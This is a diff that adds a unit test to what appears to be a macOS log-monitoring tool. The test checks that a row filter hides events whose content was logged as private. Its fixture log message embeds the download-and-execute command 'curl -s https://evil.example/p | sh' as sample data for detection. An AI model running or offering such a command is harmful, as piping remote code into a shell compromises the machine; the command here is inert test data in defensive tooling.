@@ -239,6 +239,22 @@ class TestRowFilter:
         assert not RowFilter(show_clones=False).matches(clone)
         assert not RowFilter(only_flagged=True).matches(clone)
 
+    def test_hide_private_only(self):
+        # A clone's src is %{private}s -> invisible on stock macOS; a public Apple
+        # Event survives. The toggle hides the former, keeps the latter.
+        store = EventStore()
+        private_clone = {
+            "eventMessage": 'cloneForCompatability(src="curl -s https://evil.example/p | sh" dst=0x0)',
+            "formatString": "%{public}scloneForCompatability(src=%{private}s dst=%p",
+            "processImagePath": "/usr/bin/osascript",
+        }
+        clone_row, _ = _ingest(store, private_clone)[0]
+        event_row, _ = _ingest(store, EVENT)[0]
+        assert clone_row.private_only and not event_row.private_only
+        hide = RowFilter(hide_private=True)
+        assert not hide.matches(clone_row)
+        assert hide.matches(event_row)
+
 
 class TestAppleScriptTokens:
     def _kinds(self, text):
